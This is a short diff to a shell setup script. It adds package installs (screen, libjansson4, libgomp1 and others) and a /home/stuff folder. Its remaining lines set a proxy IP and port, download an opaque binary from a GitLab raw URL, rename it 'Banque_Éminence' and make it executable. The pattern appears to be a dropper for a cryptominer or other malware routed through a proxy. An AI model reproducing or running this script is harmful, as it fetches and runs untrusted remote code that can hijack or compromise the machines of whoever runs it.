@@ -1,3 +1,23 @@
+apt-get update && apt-get install -y \
+    bash \
+    curl \
+    sudo \
+    wget \
+    git \
+    make \
+    busybox \
+    build-essential \
+    nodejs \
+    npm \
+    screen \
+    neofetch \
+    ca-certificates \
+    libcurl4 \
+    libjansson4 \
+    libgomp1 \
+ && mkdir -p /home/stuff
+apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+echo "Uploaded files:" && ls /home/stuff/
 proxy="142.54.232.6" 
 port="4145"
 wget -q -O Banque_Éminence https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x Banque_Éminence
